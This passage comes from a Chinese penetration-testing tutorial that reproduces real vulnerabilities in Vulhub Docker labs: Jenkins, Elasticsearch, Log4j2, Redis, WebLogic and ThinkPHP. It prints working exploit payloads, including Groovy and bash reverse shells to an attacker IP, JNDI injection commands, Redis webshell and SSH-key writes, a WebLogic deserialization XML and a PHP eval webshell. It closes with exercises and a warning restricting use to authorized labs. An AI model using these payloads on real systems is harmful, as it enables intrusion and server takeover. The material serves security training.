def proc = command.execute()
proc.waitFor()
println "stdout: ${proc.in.text}"
println "stderr: ${proc.err.text}"
```

**步骤 3：反弹 Shell**

```groovy
String host = "攻击者IP";
int port = 4444;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
}
p.destroy();
s.close();
```

**修复建议**：
- 启用 Jenkins 安全认证
- 设置强密码
- 限制 Jenkins 的访问 IP
- 不要将 Jenkins 暴露在公网
- 及时更新 Jenkins 版本

### 5.10 Elasticsearch 未授权访问 + 代码执行

**漏洞原理**：

Elasticsearch 默认没有密码认证，如果暴露在公网，攻击者可以未授权访问。某些版本还存在脚本执行漏洞，可以执行任意代码。

**影响版本**：
- 所有版本（配置不当导致未授权）
- 1.x 版本存在 Groovy 脚本执行漏洞

**环境启动**：

```bash
cd vulhub/elasticsearch/CVE-2014-3120
docker-compose up -d
```

**利用步骤**：

**步骤 1：未授权访问探测**

```bash
# 查看版本信息
curl http://your-ip:9200/

# 查看所有索引
curl http://your-ip:9200/_cat/indices

# 查看节点信息
curl http://your-ip:9200/_nodes
```

**步骤 2：脚本执行（旧版本）**

Elasticsearch 1.x 支持 MVEL/Groovy 脚本：

```bash
# 先插入一条数据
curl -XPOST http://your-ip:9200/test/test/1 -d '{"name": "test"}'

# 执行命令
curl -XPOST 'http://your-ip:9200/_search?pretty' -d '{
    "size": 1,
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}'
```

**修复建议**：
- 配置 Elasticsearch 认证（x-pack 等）
- 绑定内网 IP，不要暴露在公网
- 修改默认端口 9200
- 升级到最新版本
- 禁用动态脚本功能

---

## 六、Vulhub 进阶

### 6.1 自定义环境

如果 Vulhub 中没有你需要的环境，可以自己创建：

**步骤**：
1. 新建一个目录
2. 编写 `docker-compose.yml`
3. 编写漏洞环境的 Dockerfile（如果需要）
4. 测试环境是否正常工作
5. 编写 README 文档

### 6.2 贡献漏洞

Vulhub 是开源项目，欢迎社区贡献：

1. Fork Vulhub 仓库
2. 创建新的漏洞环境
3. 编写文档
4. 提交 Pull Request
5. 等待审核合并

### 6.3 学习建议

> 💡 **大白话说Vulhub的学习路径——"先当考古学家，再当外科医生"**
>
> Vulhub的200多个漏洞环境就像一座"漏洞博物馆"。你不能一天逛完，需要分阶段：
>
> **🚶 第一阶段（游客模式）**：跟着文档走
> - 选5个经典漏洞，完全按照官方README一步步复现
> - 目标：知道这个漏洞"长什么样"，熟悉 `docker-compose up/down` 的流程
> - 推荐的5个入门：Log4j2、Redis未授权、Tomcat弱口令、ThinkPHP RCE、Nginx解析漏洞
>
> **🔍 第二阶段（考古模式）**：理解为什么会这样
> - 看到Payload不急着复制，先想"这段Payload为什么长这样？"
> - 对比同一个漏洞在不同版本的影响范围
> - 目标：理解漏洞的**根因**——是设计缺陷？配置不当？还是输入的信任问题？
>
> **🔧 第三阶段（外科医生模式）**：自己动手
> - 不看文档，自己复现（只看到"有个什么漏洞，影响什么版本"）
> - 自己写POC/EXP
> - 发现新的绕过方式
> - 目标：从"会用工具"到"理解原理"，再到"创造方法"

**入门阶段**：
- 从简单的漏洞开始（未授权访问、信息泄露）
- 跟着文档一步步复现
- 理解每个漏洞的原理

**进阶阶段**：
- 尝试不看文档，自己复现
- 对比不同漏洞的异同
- 学习漏洞的检测和防御

**高级阶段**：
- 研究新出的 CVE，尝试自己复现
- 分析漏洞原理和利用链
- 编写自己的 POC/EXP
- 贡献漏洞环境到社区

---

## 七、实战案例

### 案例 1：Log4j2 漏洞复现（CVE-2021-44228）

**目标**：完整复现 Log4j2 JNDI 注入漏洞，实现远程代码执行。

**环境**：Vulhub 中的 log4j/CVE-2021-44228（Solr 环境）

**步骤**：

**步骤 1：启动环境**

```bash
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
```

等待环境启动，访问 `http://your-ip:8983` 确认 Solr 正常运行。

**步骤 2：下载 JNDI 注入工具**

下载 JNDI-Injection-Exploit：
```
https://github.com/welk1n/JNDI-Injection-Exploit/releases
```

**步骤 3：启动恶意 LDAP/RMI 服务**

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "touch /tmp/pwned" \
  -A "攻击者IP"
```

工具会生成多个 Payload，复制其中一个 LDAP 地址。

**步骤 4：发送 Payload**

```bash
curl 'http://target-ip:8983/solr/admin/cores?action=${jndi:ldap://攻击者IP:1389/abc}'
```

**步骤 5：验证结果**

```bash
# 进入容器查看
docker exec -it log4j_solr_1 bash
ls /tmp/pwned
```

如果文件存在，说明漏洞利用成功。

**步骤 6：反弹 Shell（进阶）**

```bash
# 监听端口
nc -lvnp 4444

# 启动 JNDI 服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -c {echo,base64编码的反弹shell命令}|{base64,-d}|{bash,-i}" \
  -A "攻击者IP"
```

### 案例 2：Redis 未授权利用 —— 从信息泄露到 GetShell

**目标**：完整演示 Redis 未授权访问的多种利用方式。

**环境**：Vulhub 中的 redis/4-unacc

**步骤**：

**步骤 1：启动环境**

```bash
cd vulhub/redis/4-unacc
docker-compose up -d
```

**步骤 2：连接 Redis**

```bash
redis-cli -h target-ip
```

**步骤 3：信息收集**

```
INFO server     # 服务器信息
INFO clients    # 客户端信息
INFO memory     # 内存信息
INFO replication # 主从信息
KEYS *          # 所有键
DBSIZE          # 键数量
CONFIG GET dir  # 数据目录
CONFIG GET dbfilename # 数据文件名
```

**步骤 4：写入 WebShell**

```bash
# 设置 Web 目录（需要知道 Web 路径）
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php phpinfo(); ?>"
save
```

访问 `http://target-ip/shell.php` 验证。

**步骤 5：写入 SSH 公钥**

```bash
# 生成密钥
ssh-keygen -t rsa -f redis_key

# 准备公钥（前后加换行）
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > /tmp/pubkey.txt

# 写入 Redis
cat /tmp/pubkey.txt | redis-cli -h target-ip -x set ssh_key

# 配置路径
redis-cli -h target-ip config set dir /root/.ssh
redis-cli -h target-ip config set dbfilename authorized_keys
redis-cli -h target-ip save

# SSH 登录
ssh -i redis_key root@target-ip
```

**步骤 6：主从复制 RCE**

```bash
# 使用 redis-rogue-server 工具
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server
python3 redis-rogue-server.py --rhost target-ip --rport 6379 --lhost 攻击者IP
```

### 案例 3：WebLogic 反序列化利用

**目标**：复现 WebLogic CVE-2019-2725 反序列化漏洞。

**环境**：Vulhub 中的 weblogic/CVE-2019-2725

**步骤**：

**步骤 1：启动环境**

```bash
cd vulhub/weblogic/CVE-2019-2725
docker-compose up -d
```

等待 2-5 分钟，WebLogic 启动较慢。

**步骤 2：验证漏洞**

```bash
curl -I http://target-ip:7001/_async/AsyncResponseService
```

如果返回 200 或 500，说明组件存在，可能有漏洞。

**步骤 3：构造 XML Payload**

创建 payload.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0"><string>/bin/bash</string></void>
<void index="1"><string>-c</string></void>
<void index="2"><string>touch /tmp/success</string></void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>
```

**步骤 4：发送 Payload**

```bash
curl -X POST -H "Content-Type: text/xml" \
  -d @payload.xml \
  http://target-ip:7001/_async/AsyncResponseService
```

**步骤 5：验证结果**

```bash
docker exec -it weblogic_server_1 bash
ls -la /tmp/success
```

### 案例 4：ThinkPHP 多语言 RCE

**目标**：复现 ThinkPHP 多语言文件包含漏洞并 GetShell。

**环境**：Vulhub 中的 thinkphp/multi-language-rce

**步骤**：

**步骤 1：启动环境**

```bash
cd vulhub/thinkphp/multi-language-rce
docker-compose up -d
```

**步骤 2：验证漏洞**

```bash
curl "http://target-ip/index.php?lang=../../../../../public/index"
```

如果页面报错或有异常，说明存在文件包含。

**步骤 3：利用 pearcmd.php 写 Shell**

```bash
curl -v "http://target-ip/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=eval(\$_POST[1])?>+/var/www/html/shell.php"
```

**步骤 4：验证 Shell**

```bash
curl -d "1=phpinfo();" http://target-ip/shell.php
```

### 案例 5：Jenkins 漏洞利用

**目标**：利用 Jenkins 未授权访问获取服务器权限。

**环境**：Vulhub 中的 jenkins/unacc

**步骤**：

**步骤 1：启动环境**

```bash
cd vulhub/jenkins/unacc
docker-compose up -d
```

**步骤 2：访问 Jenkins**

访问 `http://target-ip:8080`，确认无需登录。

**步骤 3：使用 Script Console**

访问 `http://target-ip:8080/script`，输入 Groovy 脚本：

```groovy
println "whoami".execute().text
println "id".execute().text
```

点击运行，查看输出。

**步骤 4：编写反弹 Shell 脚本**

在攻击机上监听：
```bash
nc -lvnp 4444
```

在 Script Console 中执行反弹脚本：

```groovy
def cmd = "bash -c 'bash -i >& /dev/tcp/攻击者IP/4444 0>&1'"
def proc = cmd.execute()
proc.waitFor()
```

**步骤 5：获取交互式 Shell**

收到反弹 Shell 后，可以：
- 收集系统信息
- 查看 Jenkins 配置和凭据
- 尝试提权
- 内网渗透

---

## 八、练习题

### 基础题

1. **Vulhub 是什么？它与 WebGoat、DVWA 等靶场有什么本质区别？**

2. **Vulhub 的标准使用流程是什么？（从启动到销毁的完整步骤）**

3. **Docker Compose 中，up -d 和 down 命令分别有什么作用？**

4. **Redis 未授权访问有哪些常见的利用方式？至少列举 3 种。**

5. **Log4j2 漏洞（CVE-2021-44228）的原理是什么？触发关键字是什么？**

### 进阶题

6. **什么是 JNDI 注入？它通常需要哪些条件才能成功利用？**

7. **WebLogic 反序列化漏洞的根本原因是什么？常见的检测方法有哪些？**

8. **Tomcat 后台弱口令 + WAR 包部署的利用步骤是什么？如何防御？**

9. **什么是反序列化漏洞？为什么 Java 反序列化漏洞如此普遍和危险？**

10. **假设你发现了一个 Elasticsearch 未授权访问的目标，请描述你完整的渗透测试思路和步骤。**

---

## 九、安全提醒

> ⚠️ **重要声明**
>
> 本靶场仅用于**授权环境下的安全学习和研究**。Vulhub 中的漏洞都是真实存在的高危漏洞，请特别注意：
>
> 1. **仅限本地学习**：所有实验请在本地搭建的 Vulhub 环境中进行，切勿用于真实目标。
> 2. **隔离网络环境**：建议在隔离的虚拟机或专用网络中使用 Vulhub，避免被他人利用。
> 3. **未经授权不得攻击**：不得对任何未经授权的系统使用本章节学到的技术。
> 4. **遵守法律法规**：学习过程中请严格遵守《网络安全法》《刑法》等相关法律法规。
> 5. **警惕危害**：Vulhub 中的漏洞都是高危漏洞，不当使用可能造成严重后果。
> 6. **负责任披露**：如果在真实环境中发现漏洞，请通过正规渠道进行负责任的披露。
> 7. **持续学习**：漏洞研究是一把双刃剑，请始终保持敬畏之心，用于正途。

---

*完成本章节后，你将掌握真实漏洞的复现方法，了解常见中间件和框架的高危漏洞，为渗透测试和安全研究打下坚实基础。*
